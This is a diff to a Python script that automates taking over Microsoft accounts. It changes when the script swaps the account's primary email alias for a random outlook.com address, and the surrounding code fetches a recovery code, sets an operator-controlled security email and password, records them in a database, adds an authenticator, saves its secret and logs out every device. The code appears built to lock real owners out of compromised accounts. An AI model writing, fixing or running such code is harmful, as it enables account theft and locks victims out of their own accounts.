@@ -129,8 +129,23 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
         if securityParameters:
 
             # Original Email
-            mainEmail = securityParameters["email"]
-            encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
+            main_email = securityParameters["email"]
+            encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
+
+            # Change Primary Alias is broken
+            if replace_alias:
+            
+                primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
+                print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
+                info = await change_primary_alias(session, primaryEmail, apicanary)
+                if info:
+                    accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
+                    main_email = f"{primaryEmail}@outlook.com"
+                    print(f"[+] - Changed Primary Alias")
+                else:
+                    accountInfo["microsoft"]["email"] = main_email
+            else:
+                accountInfo["microsoft"]["email"] = main_email
 
             recovery_code = await get_recovery_code(
                 session,
@@ -148,7 +163,7 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             database.add_security_email(security_email, password)
 
             print("[~] - Automaticly Securing Account...")
-            data = await recover(session, mainEmail, recovery_code, security_email, password, type)
+            data = await recover(session, main_email, recovery_code, security_email, password, type)
 
             if data and data != "invalid":
                 accountInfo["microsoft"]["security_email"] = security_email
@@ -162,20 +177,6 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
         auth = await add_authenticator(session)
         accountInfo["microsoft"]["auth_secret"] = auth
         print(f"[+] - Added Authenticator ({auth})")
-        
-    # Change Primary Alias is broken
-    if replace_alias:
-
-        primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
-        print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
-        info = await change_primary_alias(session, primaryEmail, apicanary)
-        if info:
-            accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
-            print(f"[+] - Changed Primary Alias")
-        else:
-            accountInfo["microsoft"]["email"] = mainEmail
-    else:
-        accountInfo["microsoft"]["email"] = mainEmail
         
     # Logout all devices
     await logout_all(session, apicanary)
